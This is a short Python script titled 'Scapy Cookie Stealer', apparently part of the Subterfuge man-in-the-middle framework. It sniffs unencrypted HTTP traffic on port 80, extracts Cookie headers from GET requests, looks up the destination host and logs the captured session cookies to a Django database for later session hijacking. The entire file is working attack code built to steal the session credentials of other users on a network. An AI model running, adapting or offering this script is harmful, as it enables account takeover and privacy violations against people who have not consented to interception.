#!/usr/bin/env python
# Scapy Cookie Stealer
# 0sm0s1z


import sys
import os
import datetime
import socket
from scapy.all import *
from scapy.utils import *

#Subterfuge Imports
sys.path.append('/usr/share/subterfuge')
sys.path.append('/usr/share')

#Subterfuge Database Models
import django
django.setup()
'''
from django.conf import settings
settings.configure(
DATABASES = {
    'default' : {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': "/usr/share/subterfuge/db",
        'USER': '',
        'PASSWORD': '',
        'HOST': '',
    }
}
)
'''

from django.db import models
from subterfuge.modules.models import *



def getCookies(pkt):
   src=pkt.sprintf("%IP.src%")
   dst=pkt.sprintf("%IP.dst%")
   sport=pkt.sprintf("%IP.sport%")
   dport=pkt.sprintf("%IP.dport%")
   raw=pkt.sprintf("%Raw.load%")
   cookiestack = []
   
   if 'GET' in raw:
      rare = raw.split('\\r\\n')
      source = ""

      for header in rare:
          if 'Cookie: ' in header:
             section = header.split(';')
             
             for cookie in section:
                try:
                   source = socket.gethostbyaddr(dst)
                   source = source[0]
                except:
                   pass
                if 'Cookie: ' in cookie:
                   cookiestack.append(cookie[8:])
                else:
                   cookiestack.append(cookie)
                   
      setcookie = ';'.join(cookiestack)
      if source != "":
         logSession(source, setcookie)

        
             
def logSession(source, cookie):
   now = datetime.datetime.now()
   date = now.strftime("%d-%m-%Y %H:%M")
   try:
      obj = sessions.objects.get(session = cookie)
   except sessions.DoesNotExist:
      obj = sessions(source = source, session = cookie, date = date)
      obj.save()
   #obj, created = sessions.objects.get_or_create(source = " ", session = cookie, date = "")
   #logc = sessions(source = " ", session = cookie, date = date)
   #logc.save()    

   
   #pkt.show()

    
a = sniff(filter="tcp and ( port 80 )", prn=getCookies)
